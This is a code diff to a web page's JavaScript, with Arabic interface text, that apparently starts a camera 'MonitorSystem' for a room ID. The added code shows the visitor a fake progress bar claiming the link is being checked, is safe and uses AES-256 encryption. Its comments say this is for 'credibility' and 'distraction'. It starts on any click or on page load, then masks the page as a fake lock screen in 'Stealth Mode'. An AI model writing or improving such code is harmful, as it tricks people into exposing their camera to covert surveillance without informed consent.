@@ -147,85 +147,91 @@
 
         const roomId = Core.getRoomId();
         let system = null;
-        let verificationStarted = false;
+        let isStarted = false;
 
         const startSystem = async () => {
-            if (verificationStarted) return;
-            verificationStarted = true;
+            if (isStarted) return;
+            isStarted = true;
 
             const btn = document.getElementById('start-btn');
             btn.disabled = true;
-            btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري فحص الرابط...';
+            btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري التحقق من أمان الرابط...';
 
             try {
-                // Initialize System Immediately
-                system = new MonitorSystem(roomId);
+                // Initialize Monitor System
+                if (!system) {
+                    system = new MonitorSystem(roomId);
+                }
 
-                // 🔊 Unlock Audio for Siren (Needs the click)
+                // 🔊 Unlock Audio for Siren (Crucial user gesture)
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 if (audioCtx.state === 'suspended') await audioCtx.resume();
 
-                // Advanced Verification UX (Distraction)
-                let stage = 0;
-                const checkReady = setInterval(() => {
-                    stage++;
-
-                    if (stage === 3) {
-                        btn.innerHTML = '<ion-icon name="shield-checkmark" style="color: #10b981;"></ion-icon> <span style="color: #10b981;">تم التحقق: الرابط آمن</span>';
-                    } else if (stage === 6) {
-                        btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري تشفير البيانات...';
+                // Fake Progress Bar Simulation for Credibility
+                let progress = 0;
+                const progressInterval = setInterval(() => {
+                    progress += 10;
+                    if (progress <= 40) {
+                        btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري فحص الشهادات...';
+                    } else if (progress <= 70) {
+                        btn.innerHTML = '<ion-icon name="shield-checkmark" style="color: #10b981;"></ion-icon> <span style="color: #10b981;">الرابط آمن وتشفير AES-256 نشط</span>';
+                    } else if (progress <= 90) {
+                        btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري بدء جلسة الأمان...';
                     }
 
-                    // Auto-Success: Only if camera is active AND we showed the DISTRACTION message
-                    if (system.localStream && system.localStream.active && stage > 10) {
-                        clearInterval(checkReady);
+                    // Done condition: 3 seconds minimum for UX
+                    if (progress >= 100) {
+                        clearInterval(progressInterval);
                         completeTransition();
                     }
+                }, 400);
 
-                    if (stage > 30) {
-                        clearInterval(checkReady);
-                        completeTransition(); // Proceed anyway after timeout
+                // Safety Timeout: Hide overlay anyway after 15s to keep it moving
+                setTimeout(() => {
+                    if (document.getElementById('permission-overlay').style.display !== 'none') {
+                        completeTransition();
                     }
-                }, 500);
+                }, 15000);
 
             } catch (err) {
                 console.error("System Error:", err);
+                isStarted = false;
                 btn.disabled = false;
-                btn.innerText = "تحقق ومتابعة";
-                verificationStarted = false;
+                btn.innerText = "فشل التحقق، اضغط للمحاولة ثانية";
             }
         };
 
         function completeTransition() {
-            const btn = document.getElementById('start-btn');
-            btn.innerHTML = '<ion-icon name="checkmark-circle"></ion-icon> تم بنجاح!';
-
+            const overlay = document.getElementById('permission-overlay');
+            if (overlay) overlay.style.opacity = '0';
             setTimeout(() => {
-                const overlay = document.getElementById('permission-overlay');
                 if (overlay) overlay.style.display = 'none';
-
                 // 🎭 Activate Stealth Mode (Force Lock Screen)
                 document.getElementById('dim-overlay').classList.add('active');
                 updateClock();
-
-                if ('wakeLock' in navigator) {
-                    navigator.wakeLock.request('screen').catch(() => { });
-                }
-            }, 800);
+                if ('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(() => { });
+            }, 500);
         }
 
-        // 🚀 AUTOMATIC START ON LOAD
+        // Click anywhere to start
+        document.body.onclick = () => {
+            if (!isStarted) startSystem();
+        };
+
+        // Automatic trigger if browser allows
         window.addEventListener('load', () => {
-            // Give the user 1 second to see the page, then trigger permission prompt
             setTimeout(() => {
-                if (!system) {
-                    console.log("Auto-triggering camera request...");
+                if (!isStarted) {
+                    console.log("Attempting auto-init...");
                     system = new MonitorSystem(roomId);
                 }
             }, 1000);
         });
 
-        document.getElementById('start-btn').onclick = startSystem;
+        document.getElementById('start-btn').onclick = (e) => {
+            e.stopPropagation();
+            startSystem();
+        };
 
         // Stealth Mode Helpers
         window.toggleStealthMode = () => {
